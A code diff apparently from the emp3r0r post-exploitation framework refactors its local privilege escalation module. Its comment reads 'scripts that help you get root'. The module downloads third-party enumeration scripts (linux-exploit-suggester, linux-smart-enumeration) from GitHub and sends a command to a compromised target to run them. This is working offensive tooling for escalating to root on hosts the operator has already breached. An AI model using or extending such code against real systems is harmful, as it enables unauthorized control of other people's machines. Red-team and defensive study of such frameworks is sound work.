@@ -5,34 +5,32 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/tun"
 )
 
+// LPEHelpers scripts that help you get root
+var LPEHelpers = map[string]string{
+	"lpe_les": "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
+	"lpe_lse": "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
+}
+
 func moduleLPE() {
-	const (
-		lesURL = "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh"
-		upcURL = "https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/1_x/unix-privesc-check"
-	)
 	// target
 	target := CurrentTarget
 	if target == nil {
 		CliPrintError("Target not exist")
 		return
 	}
+	helperName := Options["lpe_helper"].Val
 
 	// download third-party LPE helper
-	CliPrintInfo("Updating local LPE helpers...")
-	err := DownloadFile(lesURL, Temp+tun.FileAPI+"lpe_les")
+	CliPrintInfo("Updating local LPE helper...")
+	err := DownloadFile(LPEHelpers[helperName], Temp+tun.FileAPI+helperName)
 	if err != nil {
-		CliPrintWarning("Failed to download LES: %v", err)
-		return
-	}
-	err = DownloadFile(upcURL, Temp+tun.FileAPI+"lpe_upc")
-	if err != nil {
-		CliPrintWarning("Failed to download LES: %v", err)
+		CliPrintError("Failed to download %s: %v", helperName, err)
 		return
 	}
 
 	// exec
 	CliPrintInfo("This can take some time, please be patient")
-	cmd := "!" + Options["lpe_helper"].Val
+	cmd := "!" + helperName
 	CliPrintInfo("Running " + cmd)
 	err = SendCmd(cmd, target)
 	if err != nil {
